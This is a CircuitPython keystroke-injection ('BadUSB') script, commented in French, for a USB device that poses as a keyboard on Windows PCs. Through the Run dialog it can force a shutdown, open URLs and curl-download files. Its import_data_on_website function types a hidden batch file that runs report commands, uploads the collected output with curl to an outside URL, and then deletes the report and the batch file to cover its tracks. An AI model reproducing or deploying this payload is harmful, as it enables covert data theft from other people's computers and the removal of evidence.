import time
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard import Keyboard
from keyboard_layout_win_fr import KeyboardLayout
from report_command import REPORT_COMMANDS, REPORT_PATH, WEB_UPLOAD_URL


def shutdown(kbd, layout, time_shutdown=0):
    """Ouvre la boîte Exécuter et lance une commande d'arrêt"""
    kbd.send(Keycode.GUI, Keycode.R)
    time.sleep(0.3)
    layout.write("shutdown /s /t " + str(time_shutdown))
    kbd.send(Keycode.ENTER)
    time.sleep(0.3)
    kbd.send(Keycode.ENTER)

def launch_weblink(kbd, layout, url):
    """Ouvre Microsoft Edge avec l'URL spécifiée"""
    kbd.send(Keycode.GUI, Keycode.R)
    time.sleep(0.3)
    layout.write("msedge " + str(url))
    kbd.send(Keycode.ENTER)
    time.sleep(1.0)

def pdf_download(kbd, layout):
    """Télécharge un PDF dans le dossier Downloads"""
    PDF_URL = "https://laprovidence-maths-6eme.jimdofree.com/app/download/5552179912/Chap+6+-+Ex1+-+Nommer+des+angles+-+CORRIGE.pdf?t=1572467357"
    NEW_PDF_FILENAME = "p.pdf"
    command = (
        'cmd /c cd /d %USERPROFILE%\\Downloads&&curl -L "'
        + PDF_URL
        + '" -o '
        + NEW_PDF_FILENAME
    )
    
    kbd.send(Keycode.GUI, Keycode.R)
    time.sleep(0.3)
    layout.write(command)
    kbd.send(Keycode.ENTER)
    time.sleep(1.0)

def pdf_download_and_open(kbd, layout):
    """Télécharge un PDF puis l'ouvre avec l'application par défaut"""
    PDF_URL = "https://laprovidence-maths-6eme.jimdofree.com/app/download/5552179912/Chap+6+-+Ex1+-+Nommer+des+angles+-+CORRIGE.pdf?t=1572467357"
    NEW_PDF_FILENAME = "p.pdf"
    command = (
        'cmd /c cd /d %USERPROFILE%\\Downloads&&curl -L "'
        + PDF_URL
        + '" -o '
        + NEW_PDF_FILENAME
        + '&&start '
        + NEW_PDF_FILENAME
    )
    
    kbd.send(Keycode.GUI, Keycode.R)
    time.sleep(0.3)
    layout.write(command)
    kbd.send(Keycode.ENTER)
    time.sleep(1.0)

def import_data_on_website(kbd, layout):
    """Crée un batch, écrit les commandes, l'exécute, puis le supprime"""
    time.sleep(1.0)
    # Ouvre Notepad pour créer le batch dans %TEMP%
    kbd.send(Keycode.GUI, Keycode.R)
    time.sleep(0.3)
    layout.write("notepad %TEMP%\\temp_report.bat")
    kbd.send(Keycode.ENTER)
    time.sleep(0.5)
    kbd.send(Keycode.ENTER)
    time.sleep(2.0)
    
    # Contenu du batch - en-têtes
    batch_lines = [
        "@echo off",
        "chcp 65001 > nul",
        "echo. > %TEMP%\\rapport_demo.txt",
    ]
    
    # Ajoute chaque commande du rapport au batch
    for title, command, wait in REPORT_COMMANDS:
        batch_lines.append(f"echo. >> %TEMP%\\rapport_demo.txt")
        batch_lines.append(f"echo [{title}] >> %TEMP%\\rapport_demo.txt")
        batch_lines.append(f"{command} >> %TEMP%\\rapport_demo.txt 2>&1")
    
    # Ajoute l'upload et la suppression
    batch_lines.append("curl -F \"file=@%TEMP%\\rapport_demo.txt\" " + WEB_UPLOAD_URL)
    batch_lines.append("del %TEMP%\\rapport_demo.txt")
    batch_lines.append("del %TEMP%\\temp_report.bat")
    
    # Tape le contenu du batch ligne par ligne
    for line in batch_lines:
        layout.write(line)
        kbd.send(Keycode.ENTER)
        time.sleep(0.05)  # Petit délai entre chaque ligne
    
    # Sauvegarde et ferme Notepad
    kbd.send(Keycode.CONTROL, Keycode.S)
    time.sleep(0.2)
    kbd.send(Keycode.ALT, Keycode.F4)
    time.sleep(0.5)
    
    # Exécute le batch via Windows+R
    kbd.send(Keycode.GUI, Keycode.R)
    time.sleep(0.3)
    layout.write("%TEMP%\\temp_report.bat")
    kbd.send(Keycode.ENTER)
    time.sleep(15.0)  # Attente pour exécuter toutes les commandes